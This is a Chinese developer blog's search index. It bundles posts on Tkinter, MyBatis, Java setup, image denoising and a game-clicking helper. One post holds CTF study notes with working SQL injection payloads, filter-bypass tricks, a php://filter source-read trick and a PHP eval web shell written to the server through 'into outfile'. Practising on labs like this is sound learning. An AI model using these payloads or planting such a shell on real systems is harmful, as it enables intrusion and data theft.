<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Tkinter重要的一个要点]]></title>
    <url>%2F2020%2F02%2F08%2FTkinter%E9%87%8D%E8%A6%81%E7%9A%84%E4%B8%80%E4%B8%AA%E8%A6%81%E7%82%B9%2F</url>
    <content type="text"><![CDATA[对于任何一个需要绑定的东西如: .after() .bind() 。。。and so on. 不能直接传参数，（如果传参数，那么在运行到这个地方的时候则会直接运行该方法，甚至导致.bind()或者.after()失效）必须要用lambda: 你的函数(你的参数)，如果你在.after里面出现了传参的方法，那么大概率会出现以下异常: RuntimeError: maximum recursion depth exceeded 这个坑了我几个小时。这个小细节真的很要命。]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pywintypes.error异常处理]]></title>
    <url>%2F2020%2F02%2F08%2Fpywintypes.error%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86%2F</url>
    <content type="text"><![CDATA[我的原答案见：https://stackoverflow.com/questions/25053785/how-to-catch-these-exceptions-individually/60075942#60075942 之前使用有关win32的库时，有时候会出现pywintypes.error异常，但我看的各种异常里面并没有看到pywintypes.error的异常。 今天调试了一下：发现现在已经将pywintypes.error归为BaseException。其他还是看网站的答案吧，我懒得说了，]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[为tkinter.scrolledText设置边框]]></title>
    <url>%2F2020%2F01%2F19%2F%E4%B8%BAtkinter.scrolledText%E8%AE%BE%E7%BD%AE%E8%BE%B9%E6%A1%86%2F</url>
    <content type="text"><![CDATA[scrolledText没有什么参考文档 python官方文档是这个页面。当中提到scrolledText的构造方法和Text基本类似。 1234567import tkinterfrom tkinter import scrolledtextWin = tkinter.Tk()Text = scrolledtext.ScrolledText(Win)Text.pack(padx=10,pady=10)Win.mainloop() 能制作一个简单的滚动文本框是这样子的情况，但这个文本框边框很丑，，，，我找了很久文档也没有找到怎么设置tkinter的某个组件的边框，在堆栈溢出网站找到一个方法，源网站 试过1234如果想加边框设置```relief=&quot;solid&quot;```，即可即 import tkinterfrom tkinter import scrolledtext Win = tkinter.Tk()Text = scrolledtext.ScrolledText(Win,relief=”solid”)Text.pack(padx=10,pady=10)Win.mainloop()` 界面如图 觉得边框太窄的可以自己设置borderwidth设置宽度。这个solid属性我试了半天，那个Text网站里面都没写这个属性。看报错结果出来的 顺便说一下。relief的不同参数对应的效果： sunken:内部包括边框整体向内凹陷。(大多默认是这个) raised: 内部包括边框整体向外凸起。 groove: 仅内部突起 ridge: 仅边框突起 flat: 无边框 solid: 有实边框]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tkinter实现选择不同的单选框Radiobutton选项时修改另一个下拉菜单Combobox(OptionMenu也可)的选项内容]]></title>
    <url>%2F2020%2F01%2F19%2FTkinter%E5%AE%9E%E7%8E%B0%E9%80%89%E6%8B%A9%E4%B8%8D%E5%90%8C%E7%9A%84%E5%8D%95%E9%80%89%E6%A1%86Radiobutton%E9%80%89%E9%A1%B9%E6%97%B6%E4%BF%AE%E6%94%B9%E5%8F%A6%E4%B8%80%E4%B8%AA%E4%B8%8B%E6%8B%89%E8%8F%9C%E5%8D%95Combobox(OptionMenu%E4%B9%9F%E5%8F%AF)%E7%9A%84%E9%80%89%E9%A1%B9%E5%86%85%E5%AE%B9%2F</url>
    <content type="text"><![CDATA[我看国内好像根本没什么教程讲tkinter的许多实现方法。 直接讲如何使用吧实例： 1234567891011121314151617181920212223242526import tkinterfrom tkinter import ttkdef change(): global list if (mode.get() == "A"): list.config(values=["A"]) list.current(0) else: list.config(values=["B"]) list.current(0)win = tkinter.Tk()mode = tkinter.StringVar()langlist = tkinter.StringVar()choiceA = ttk.Radiobutton(win,text="A",var=mode,value="A",command=change)choiceB = ttk.Radiobutton(win,text="B",var=mode,value="B",command=change)mode.set("A")list = ttk.Combobox(win,textvariable=langlist, state="readonly", width=10)list['value'] = ["A"]list.current(0)choiceA.pack()choiceB.pack()list.pack()win.mainloop() 主要思路：为radiobutton绑定函数change对list的内容修改，既可按照config方法修改，也可以用list[‘value’]传值修改 觉得好就点个赞吧~~~]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tkinter实现当选择一个不同下拉框(Combobox,OptionMenu都可)的值时修改另一个下拉框的值]]></title>
    <url>%2F2020%2F01%2F19%2FTkinter%E5%AE%9E%E7%8E%B0%E5%BD%93%E9%80%89%E6%8B%A9%E4%B8%80%E4%B8%AA%E4%B8%8D%E5%90%8C%E4%B8%8B%E6%8B%89%E6%A1%86(Combobox%2COptionMenu%E9%83%BD%E5%8F%AF)%E7%9A%84%E5%80%BC%E6%97%B6%E4%BF%AE%E6%94%B9%E5%8F%A6%E4%B8%80%E4%B8%AA%E4%B8%8B%E6%8B%89%E6%A1%86%E7%9A%84%E5%80%BC%2F</url>
    <content type="text"><![CDATA[这个国内依旧没有教程。本人之前也以为无法实现，查阅各种资料找到了方法。 实例：1234567891011121314151617181920212223242526import tkinterfrom tkinter import ttkdef change(*args): global list if (mode.get() == "A"): list2.config(values=["you choose A"]) list2.current(0) else: list2["value"]=["you choose B","you choose B yes!"] list2.current(0)win = tkinter.Tk()mode = tkinter.StringVar()langlist = tkinter.StringVar()list1 = ttk.Combobox(win,textvariable=mode,state="readonly", width=10)list1.bind("&lt;&lt;ComboboxSelected&gt;&gt;",change)list1['value'] = ("A","B")list1.current(0)list2 = ttk.Combobox(win,textvariable=langlist, state="readonly", width=50)list2.config(values=["you choose A"])list2.current(0)list1.pack()list2.pack()win.mainloop() 思路： 由于Combobox没有command参数，所以不能按照RadioButton那样直接修改，这里使用了bind绑定事件，绑定ComboboxSelected事件，即当修改Combobox的值时执行函数，再用函数对第二个下拉菜单Combobox进行修改。 注：我在函数的if,else里面用了2种方法修改了list2的方法，2种都是可行的！ 觉得好就点个赞吧~~~]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis学习笔记（二）]]></title>
    <url>%2F2019%2F12%2F27%2FMybatis(2)%2F</url>
    <content type="text"><![CDATA[编写日志输出环境配置文件 配置好环境后，工程目录结构基本出来了 此时编写日志输出环境配置文件，打开.properties文件 写入以下信息： 1234567891011121314151617181920log4j.rootLogger = DEBUG, stdout # 开发时选择DEBUG(会在控制台打印底层运行信息)，生产环境设置为INFO（控制台打印出程序运行的主要步骤信息）或者ERROR（打印出不影响程序运行的错误事件），后面的stdout代表将xxx（此处为DEBUG）的日志信息输出到stdout参数所指定的载体中。#Console outputlog4j.appender.stdout = org.apache.log4j.ConsoleAppender # 设置名为stdout的输出载体类型，目前有：ConsoleAppender（控制台），FileAppender（文件），DailyRollingFileAppender（每天产生一个日志文件），RollingFileAppender（文件大小到达指定大小时产生一个新文件），WriterAppender（将日志信息以流格式发送到任意指定的地方），此处是打到Eclipse的控制台，所以选ConsoleAppenderlog4j.appender.stdout.layout = org.apache.log4j.PatternLayout # 设置载体界面是什么布局，目前有：HTMLLayout（以HTML表格形式布局），PatternLayout（可以灵活指定布局模式），SimpleLayout（包含日志信息级别和信息字符串），TTCCLayout（包含日志时间，线程，类别等信息）log4j.appender.stdout.layout.ConversionPattern = %5p [%t] -%m%n#由于上一处已经选择了PatternLayout，所以要指定打印信息的具体格式。大致配置元素如下：%m 输出代码中指定的信息%p 输出优先级，即DEBUG,INFO,WARN,ERROR和FATAL%r 输出自应用启动到输出该log信息耗费的毫秒数%c 输出所属类名%t 输出产生该日志事件的线程名%n 换行%d 输出日志的日期或事件可以指定格式 如%D&#123;yyyy MMM dd HH:mm:ss,SSS&#125;输出类似xxxx年x月x日 xx:xx:xx,xxx%l 输出日志事件发生的位置，包括类目名，发生的线程，以及代码行数 编写数据库连接池配置文件连接池配置文件即SqlMapConfig.xml，首先写好文件头xml的版本信息以及编码格式信息，为了符合DTD文档定义类型，前2行XML配置信息为： 1234&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE configurationPUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;&quot;http://mybatis.orfg/dtd/mybatis-3-config.dtd&quot;&gt; 然后。所有的配置应位于configuration标签对中，在这之中的配置标签必须按照先后顺序配置 先在configuration标签对中先配置setting标签对，配置日志输出模式logImpl为LOG4J，Mybatis的环境信息配置在environment标签对中，里面允许出现多个environment标签对，每一个单独的environment标签对代表一个单独的数据库配置环境transcationManager标签配置的是Mybatis的事务控制类型，而dataSource标签配置的是数据库连接信息，包含多个property标签，用来放driver，数据库连接地址url，用户名，密码。 最终大致如下： 1234567891011121314151617&lt;configuration&gt; &lt;setting&gt; &lt;setting name=&quot;logImpl&quot; value=&quot;LOG4J&quot;/&gt; &lt;/setting&gt; &lt;!-- Spring中environment将被非齐--&gt; &lt;environment id=&quot;development&quot;&gt; &lt;!-- 使用JDBC事务管理 --&gt; &lt;transcationManager type=&quot;JDBC&quot; /&gt; &lt;!-- 数据库连接池 --&gt; &lt;dataSource type=&quot;POOLED&quot;&gt; &lt;property name=&quot;driver&quot; value=&quot;com.mysql.jdbc.Driver&quot;/&gt; &lt;property name=&quot;url&quot; value=&quot;jdbc:mysql://localhost:3306/databasename?serverTimezone=GMT&amp;characterEncoding=utf-8&quot;/&gt; &lt;property name=&quot;username&quot; value=&quot;root&quot;/&gt; &lt;property name=&quot;password&quot; value=&quot;xxxx&quot;/&gt; &lt;/dataSource&gt; &lt;/environment&gt;&lt;/configuration&gt; 除此之外该文件还应该包含Mapper映射的文件声明以及别名定义等功能，但后面SpringMVC时大部分的信息都可以交给Spring来管理。 编写SQL映射配置文件即编写UserMapper.xml（这里是举个例子），文件头仍然为DTD类型，和SqlMapConfig.xml是一样的头。 然后所有的配置应在mapper标签中，mapper标签有namespace属性，用于对SQL进行分类化管理，实现不同业务的SQL隔离。（namespace还有重要的作用，以后再写）。 SQL有增删改查这几大类，对应的标签对为insert,detele,update,select，如果这里配置一个查询语句，选择select标签，每一个SQL配置标签都有： parameterType: 输入参数的类型，指基本数据类型或者包装类型 parameterMap: 输入参数的集合，一般是Map集合 resultType: 结果类型，和第一个一样 resultClass: 结果的类 resultMap: 结果的集合，一般是Map集合 此时的大致内容如下： 12345678910&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE configurationPUBLIC &quot;-//mybatis.org//DTD Config 3.0//EN&quot;&quot;http://mybatis.orfg/dtd/mybatis-3-config.dtd&quot;&gt;&lt;mapper namespace=&quot;test&quot;&gt; &lt;select id=&quot;findUserById&quot; paramterType=&quot;int&quot; resultType=&quot;cn.com.mybatis.po.User&quot;&gt; SELECT * FROM USER WHERE id=#&#123;id&#125; &lt;/select&gt;&lt;/mapper&gt; id为findUserById，因为SQL映射配置文件都会被解析并封装到mappedStatement对象中，为了调取相应的SQL，需要唯一的标识，所以该属性即为Statement的id。 parameterType为int，代表指定输出参数为int。 resultType代表每单条记录将映射成名为User的Java对象。 select标签中的即为查询语句#{}代表占位符，#{id}，id代表接受输入参数的名称。若parameterType为简单类型（int，string，long，Date等），#{}中的值可以是任意数据 编写完成之后，在SqlMapConfig.xml的configuration标签最后（必须是）加入下列信息： 123&lt;mappers&gt; &lt;mapper resource=&quot;sqlmap/UserMapper.xml&quot;/&gt;&lt;/mappers&gt;]]></content>
      <tags>
        <tag>Java</tag>
        <tag>Mybatis</tag>
        <tag>JDBC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mybatis学习笔记（一）]]></title>
    <url>%2F2019%2F12%2F22%2FMybatis%2F</url>
    <content type="text"><![CDATA[MyBatis整体构架 数据源配置文件数据库的数据源配置文件是SqlMapConfig.xml，要配置数据库驱动，数据库链接地址，用户名，密码等。如果有性能要求，可以配置连接池的连接数和空闲时间等参数。 大致内容（部分配置）： 1234567891011121314151617181920&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE configurationPUBLIC "-//mybatis.org//DTD Config 3.0//EN""http://mybatis.org/dtd/mybatis-3-config.dtd"&gt;&lt;configuration&gt; &lt;environments default="development"&gt; &lt;environment id="development"&gt; &lt;!--使用JDBC事务管理--&gt; &lt;transactionManager type="JDBC"/&gt; &lt;!--数据库连接池--&gt; &lt;dataSource type="POOLED"&gt; &lt;property name="driver" value="org.gjt.mm.mysql.Driver" /&gt; &lt;property name="url" value="jdbc:mysql://localhost:3306/mydata?characterEncoding=utf-8"/&gt; &lt;property name="username" value="root"/&gt; &lt;property name="password" value="xxxx"/&gt; &lt;/dataSource&gt; &lt;/environment&gt; &lt;/environments&gt;&lt;/configuration&gt; 可以在mapper标签中配置SQL语句。select标签堆中包含一堆SQL查询语句。parameterType指定输入参数的类型，resultType指定了输出结果映射的Java对象类型。这查询结果会将单条记录映射成Java的一个对象。 SQL映射配置文件数据库的SQL映射配置文件是Mapper.xml，对于SQL语句执行的参数，以及查询语句返回的结果集对象。 大致内容（部分配置）： 12345678910&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;!DOCTYPE mapperPUBLIC "-//mybatis.org//DTD Mapper 3.0//EN""http://mybatis.org/dtd/mybatis-3-mapper.dtd"&gt;&lt;mapper&gt; &lt;select id="findUserById" parameterType="int" resultType="cn.com.mybatis.model.User"&gt; SELECT * FROM USER WHERE id=#&#123;id&#125; &lt;/select&gt;&lt;/mapper&gt; 可以在mapper标签中配置SQL语句。select标签堆中包含一堆SQL查询语句。parameterType指定输入参数的类型，resultType指定了输出结果映射的Java对象类型。这查询结果会将单条记录映射成Java的一个对象。 需要配置mapper.xml的文件路径，要在SQL映射配置文件（SqlMapConfig.xml）下加入 1234&lt;mapper&gt; &lt;!--应该是相对路径--&gt; &lt;mapper resource="sqlmap/UserMapper.xml"/&gt;&lt;/mapper&gt; 会话工厂与会话配置好以上文件后，需要读取和加载这些信息，就要用到核心对象“会话工厂”和“会话”。会话工厂即SqlSessionFactory类，它会根据Resources资源信息加载对象，获取开发人员在项目中配置的数据库连接池配置文件SqlMapConfig.xml信息，产生实例类SqlSession Mybatis运行流程]]></content>
      <tags>
        <tag>Java</tag>
        <tag>Mybatis</tag>
        <tag>JDBC</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Java（Eclipse）导入MySQL驱动]]></title>
    <url>%2F2019%2F11%2F14%2FJava%E5%AF%BC%E5%85%A5%E6%95%B0%E6%8D%AE%E5%BA%93%E5%8C%85%2F</url>
    <content type="text"><![CDATA[步骤如下： 1、下载jar驱动首先去MySQL官网下载驱动，地址在这里噢！！！！！，选择Platform Independent，下载ZIP版本的就可以了。 2、下载完成之后导入jar包我用的是Eclipse，右键你的项目名，点击属性会出现如图： 再点击Java 构建路径（英文版的应该是Java Bulid Path），如图： 然后应用关闭就可以了。 此时的编译器就不会报错了~( ^ω^)]]></content>
      <tags>
        <tag>Java</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ctf学习笔记]]></title>
    <url>%2F2019%2F10%2F26%2Fctf%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[sql-labs试炼： 基础方法order by 经常用不了，所以要用union select 可以判断列数1、有关union select：判断注入位。然后前提条件：有显示位（即有数据库展示数据的位置） 常用方法：group_concat()：一次性打出语句中夹杂的limit：sql在查询时，经常会出现多行结果，用limit可以限定打出的结果，比如仅仅打出第一行，就使用limit 0,1，想打出查询结果的第二行和第四行，用limit 1,3（从第二行到第四行） mysql的information_schema库内含数据库的许多信息：综合以上一般注入可以用到：①、1,2,group_concat(table_name) from INFORMATION_SCHEMA.tables where table_schema=database() #表示 + 一次性打出 + 当前数据库的所有的表名，from语句必须放在union select 后面。②、group_concat(column_name) from INFORMATION_SCHEMA.columns where table_schema=database() #表示 + 一次性打出 + 当前数据库的所有的col（列）③、select concat((select database()))：显示当前数据库名字，④、substr(str,int,int)：截取str字符串，从int位开始，截取int位，这里是从1开始，第一个字母为1 sql报错盲注：三种方式：floor（输出长度64位），updatexml（32位，且payload返回不是xml格式），extractvalue（32位））以下为sqllabs less5（利用floor）：①、爆出当前数据库、用户名：（[1]是为了凑够一行）id=1&#39; union select count(*),[1],concat((select database()), floor(rand(0)*2))as a from information_schema.columns group by a --+ 报错注入的例句，该句会爆出当前使用数据库的名称和一个1或者0的随机数：concat()连接函数，floor()取整函数，rand()是随机生成一个0-1的数字。同时，我们还可以替换掉database()，替换成version()，则会爆出所选的版本。#使用于ubuntu版本的mysql ②、爆出某个数据库的表：id=1&#39; union select count(*),[1], concat(&#39;~&#39;,(select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a --+，更改limit后面的第一个数字数字可以爆出所有的表（此处信息超过一行，所以就不能使用group_concat，替换成concat并使用limit，limit代表输出的起始位置，1代表输出1一个，即从0开始输出1一个）。security是已经获取的数据库 ③、爆出某表某列：id=1&#39; union select count(*),[1], concat(&#39;~&#39;,(select column_name from information_schema.columns where table_schema=&#39;security(数据库)&#39; and table_name=&#39;emails(表名)&#39; limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a --+修改limit后面的数字可以爆出所有的列。 ④、爆出数据：id=1&#39; union select count(\*),[1], concat(&#39;~&#39;,(select email_id from emails limit 0,1),&#39;~&#39;, floor(rand()*2)) as a from information_schema.tables group by a --+ sql 已得权限 注入（less-7）：得拥有能够读写的权利，且拥有一个明确的绝对路径，文件必须小于max_allowed_packet。（判断是否有读写权限的sql语句：and (select count(*) from mysql.user)&gt;0 如果结果正常说明有读写权利）利用语句select &lt;?php @eval($_POST[&quot;haha&quot;])?&gt; into outpile &quot;一个明确的服务器路径&quot;，给服务器传入一个php文件，此时服务器里面就会有一个这个文件存在你写的路径里面，此时便可以用菜刀来做了。 sql 时间延迟盲注（建议用python写脚本，就相当于真盲注）：可以先看过滤情况，再判断是使用if(exp1,exp2,exp3)(使用方法：如果exp1成立，则执行exp2，否则执行exp3)还是使用case when exp1 then sleep(x) else 1 end（当exp1成立，则sleep x秒，否则就是以1结束），也就是如果注入成功，则页面会sleep x秒，否则直接出现页面不会sleep sql (真)盲注（Less-8）（python写脚本）：也是在找到注入点之后进行注入。(这里加入单引号为注入点) ①爆数据库：url修改为: url+&quot;?id=1&#39; and ascii(substr(database(),&quot;+str(i)+&quot;,1))=&quot;+str(j)+&#39;--+，i是代表数据库的第几位数，j是代表ascii码，利用返回的网页源码和正则匹配判断网页是否正常（”显示You are in…..”），通过此方法得到数据库的完整名。此时已经爆出数据库名为security ②爆表：url修改为: url+&quot;?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit &quot;+&quot;str(x)&quot;+&quot;,1),&#39;+str(i)+&#39;,1))=str(j)&quot;，其中x代表是位置为x的表，i代表该位置表的第i位，j代表该位置表的第i位的ascii码，通过此方法可以爆出security下面所有的表 sql insert into注入(bugku insert into注入 )新版本无法注入（会报错显示Truncated incorrect DOUBLE value）网站执行的sql语句为：insert into client_ip (ip) values (&#39;$ip&#39;)，伪造xff头，为1&#39; and sleep(5)) #输入构建成完整语句：insert into client_ip (ip) values (&#39;1&#39; and sleep(5))，此时会发现网页会sleep 5秒，即insert注入成功，再修改sleep(5)为其他注入语句即可似乎在insert注入中无法使用–+截断之后的字符，要用# sql update注入（Less-17）:先找到注入点（也就是后面加什么符号），然后利用注入语句updatexml(2,concat(0x7e,(select database())),0)+收尾即可 sql 异或注入（bugku-sql注入2）：1、.DS_Store扫描漏洞2：（重点），这题过滤了许多字符。但通过bp发现&#39;,-没有被过滤，无法使用一般的--+等其他方法注释掉其他方法。找到闭合点为&#39;，构造登陆语句为：admin &#39;-(xxx)-&#39;进行注入（xxx可以使用任意能连接and的语句）解释：后面的&#39;为了闭合，-就是减号，&#39;&#39;而符合条件的正常字符串结果为1，where语句就相当于对每一行的col值进行判断，判断where表达式的值是否为1，是就输出该行的col值。所以此题可以通过判断返回的是否是用户名错误（正常情况下用户名就是admin，密码可以随便输入，因为它是先判断用户名是否正确再判断密码是否正确）或者密码错误的情况判断括号里面的表达式是否正确，如果正确就返回密码错误，反之则是账号错误。 过滤技巧：1、由于此题空格和,都被过滤了，可用的方法就少了，substr，mid，left等方法不能使用逗号，就要换方法使用，比如substr(‘abcde’from(1)for(1))=a（数字两边一定要有括号，其他同理，第一个，都要替换成for(这里的)，注意，from的第一个字母为1，），此题ascii没有过滤，索性使用ascii方法注入（注意，如果是一个长字符串，ascii方法测试的仅仅是第一个字符串）。之后就可以使用python脚本注入了。（空格可以用/*/代替，语句之间用+也可以）2、等号过滤之后可以使用!(exp1&lt;&gt;exp2)，这等于exp1=exp2，还有like，in，between…and…（&gt;=前面且&lt;=后面）等方法。3、select过滤之后可以尝试使用/\!%53eLEct*/绕过，修改成sel+ect（效果甚微，一种方式），修改大小写，修改成url编码，修改成s/**/e/**/l/**/e/**/c/**/t，修改成chr(xx)+chr(xx)+chr(xx)的形式，修改成hex格式，或者内嵌入会被过滤掉的字符 ip欺骗Remote Address：具有一定的防篡改功能（修改之后获取不到响应报文），是发送请求的源地址，但如果被服务器的反向代理器转发，就收不到用户的真实IP，所以就有了xff，xff用来存储用户的真实地址，然后发送给后端xff（X-Forwarded-For）：是http请求端真正的ip，也就是用户的ip，但可以被修改 做题时可以通过修改xff获取flag。 命令注入执行命令： XSS做题记录1、设法弹窗：①如果被过滤掉了\&lt;script>标签，可以直接尝试使用其他标签在标签中加入onerror，②如果输入\或者&lt;/\xxx&gt;都会被过滤， upload 试炼1、 通过截断上传数据包，修改Content-Type来上传 ？？1、对于定时刷新的网页，可以用python的session提交。2、 php伪协议获取当前php页面源码：?page=php://filter/read=convert.base64-encode/resource=xxx.php 弱类型比较 一般题记录漏洞绕过：1、要求$_GET[‘num’]==1，但is_numeric函数判断输入的是否是纯数字，输入任意1+str都可以过。2、php的ereg(i)函数，可以使用%00截断，这个%00会被转义成\0，被算作一个结束符，也就是一个字符 3、文件绕过：上传php文件，有关php的文件类型有php2,php3,php4,php5,phtml,phtm,phps。4、intval漏洞：intval(“十六进制”)会返回0，但intval(“十六进制+1”)会强制转换成数形。(旧版本漏洞)5、php的chr()本质是对256取余，遇到类似判定可使用。6、代替空格的方法： %09 TAB键（水平） ​ %0a 新建一行 ​ %0b TAB键（垂直） ​ %0c 新的一页 ​ %0d return功能 ​ %a0 空格7、django使用的gbk编码，超过%F7的编码在gbk中无意义，当站点设置的CURLOPT_SAFE_UPLOAD为True时，如果在请求前面加@，phpcurl组件会把后面的字符当成绝对路径请求来读取文件，当且仅当文件中存在中文字符的时候。django才会报错获取文件内容。8、php5.5.0前，传入修饰符’\e’会使preg_replace方法的replacement（第二个参数）部分会被执行成php代码(前提能发生替换行为)，PHP正则开头前会要加/9、当system(“”)无法使用时，可以使用print_r(scandir(‘.’))获取路径，var_dmup(file_get_contents(‘路径’))]]></content>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pyinstaller打包使用tcl/tk扩展]]></title>
    <url>%2F2019%2F08%2F20%2Fpyinstaller%E4%BD%BF%E7%94%A8tcl%E5%92%8Ctk%E6%89%A9%E5%B1%95%2F</url>
    <content type="text"><![CDATA[现在网上很多的pyinstaller教程都已经过时了比如这篇18年7月的某篇博客：https://blog.csdn.net/BearStarX/article/details/81054134不说其他的参数，但这个参数是错的，总之是无法使用，会报错在多次查询资料后，有两种方法：1、在.spec里面的datas里面加入该tcl/tk扩展的路径以及名称。执行pyinstaller [-w] xx.spec2、可以直接在打包时直接加入参数 --add-data，该方法是可行的，只是目前本人使用时会报错]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[图片去噪的一种思路与方法（用途：识别验证码等），接很久之前的找茬的那篇博客]]></title>
    <url>%2F2019%2F07%2F05%2F%E5%9B%BE%E7%89%87%E5%8E%BB%E5%99%AA%E7%9A%84%E4%B8%80%E7%A7%8D%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%96%B9%E6%B3%95%EF%BC%88%E7%94%A8%E9%80%94%EF%BC%9A%E8%AF%86%E5%88%AB%E9%AA%8C%E8%AF%81%E7%A0%81%E7%AD%89%EF%BC%89%EF%BC%8C%E6%8E%A5%E5%BE%88%E4%B9%85%E4%B9%8B%E5%89%8D%E7%9A%84%E6%89%BE%E8%8C%AC%E7%9A%84%E9%82%A3%E7%AF%87%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[本人自己用的简单暴力的去噪思路： &emsp;&emsp;把图片分成众多小矩形，每一个小矩形进行判断白点（图片已经二值化处理），如果该矩形内的白点大于一个值（这个值可以根据你取得矩形的大小进行酌情处理）。小于这个值则这一块的值变成0（黑色）。 过程：我有如下部分代码1234.... # 图片已经打开，保存在img变量里面pixel = img.load()print(pixel[x,y]) # 打印出坐标为（x，y）的像素值 利用PIL库的im.load方法（im.load方法算是PIL库里面处理像素问题比较快的），可以得到一个图片每个像素的像素值，实质上是一个二维队列（就像C语言里面的二维数组）,注意：如果你将图片二值化（图片convert(‘1’)，）或者convert(‘1’)，就只会显示一个数字。例如：1234img2 = img.convert(&apos;L&apos;)pixel2 = img2.load()print(pixel2[x,y]) # 显示一个数字，该数字位于0~255之间，每个像素用8bit表示# 如果前面是img2 = img.convert(&apos;1&apos;)二值化后，结果只可能是0（黑），或者255（白0 在RGB模式或者RGBA模式下，打印一个像素的值，结果会显示一个元祖，形式为(R值，G值，B值)或者（R值，G值，B值，A值）。 以上大概介绍了一下load之后获得了一个二维列表，接下来开始进行去噪处理： 本人的思路是，先图片二值化，利用2个for循环遍历整个图片大小的像素值，将图片切成一个个小矩形，判断每个矩形内白点，然后设定一个值（这个值根据你切的大小以及像素多少自己定义个数字就可以了），矩形是越小越好，越小虽然会增加计算机的计算时间，但可以使图片去噪效率更高。 我这里上了我那次辅助的去噪代码（部分）图片是480*360分辨率。123456789101112131415for xx in range(40): # 横着12 竖着9 运行40次 0代表黑色，255代表白色，去噪点 for yy in range(40): # 每一个24*18 x = xx * 12 y = yy * 9 count = 0 for i in range(0, 12): for j in range(0, 9): if (array[i + x, j + y] == 255): count = count + 1 if count &lt;= 10: # 去黑点的地方，也就是该区域内白点小于等于10，判断是噪点，则像素值全部赋值为0，也就是这区域全黑。 for i in range(0, 12): for j in range(0, 9): array[i + x, j + y] = 0 else: # 留白的地方，点击中心位置 xy.append([x + 12, y + 9]) # 坐标是基于图像，要基于游戏]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[java环境配置，以及安装eclipse时弹出网页jre missing]]></title>
    <url>%2F2019%2F06%2F30%2Fjava%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE%EF%BC%8C%E4%BB%A5%E5%8F%8A%E5%AE%89%E8%A3%85eclipse%E6%97%B6%E5%BC%B9%E5%87%BA%E7%BD%91%E9%A1%B5jre%20missing%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;我之前安装过jre（为了玩MC），听说安装jdk时会自动装一个jre，然后我把程序名为java 8 update 211的程序卸载了，结果发现并没有装，以下是解决方法：https://blog.csdn.net/F_K999/article/details/90230546&emsp;&emsp;第二个坑：当成功配置java环境后，下载eclipse的坑，如果直接去eclipse官网下载eclipse的在线安装包，反正我这里是一直显示jre missing，但我进cmd运行java什么的都可以。（网上有另外一种答案就是说你安装的eclipse的是64位，而jdk是32位，我不是，我两个都是64位，也会报错）这个百度谷歌了半天，也没找到解决方案。后面我直接在官网找到了原压缩包。网站：https://www.eclipse.org/downloads/packages/release/2019-06/r/eclipse-ide-java-developers]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python制作_QQ游戏--大家来找茬_游戏辅助（一）。]]></title>
    <url>%2F2019%2F05%2F15%2Fpython%E5%88%B6%E4%BD%9C_QQ%E6%B8%B8%E6%88%8F--%E5%A4%A7%E5%AE%B6%E6%9D%A5%E6%89%BE%E8%8C%AC_%E6%B8%B8%E6%88%8F%E8%BE%85%E5%8A%A9%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[&emsp;&emsp;”大家来找茬”是我小时候在家里家里人都喜欢玩的一款休闲游戏，因为这游戏可以考验人的眼力和反应能力才不是因为电脑垃圾玩不了其他大作游戏(╯‵□′)╯︵┻━┻&emsp;&emsp;最近了解到了一个特别牛逼的python第三方库———pywin32库，这个库是超级牛逼，打个比方，可以根据你的代码，大到鼠标操作，键盘操作，小到弹窗的声音，都能做到。不过网上关于该库的教程太少了，找不到专门的python文档来看。 &emsp;&emsp;PIL库的文档也少之又少。 &emsp;&emsp;本人代码还没写完，而且代码很杂，我都有点晕了。 &emsp;&emsp;我说下我做这个辅助的大体思路吧。 &emsp;&emsp;Sade，ikuzo(๑•̀ㅂ•́)و✧ 1、屏幕抓取。2、图片对比，找出不同之处。3、找到不同之处的坐标值，利用win32api的mouse_event进行单击操作。&emsp;&emsp;怎么样，是不是很简单呢？简单个P（对我来说） &emsp;&emsp;我来再说点详细方法吧。 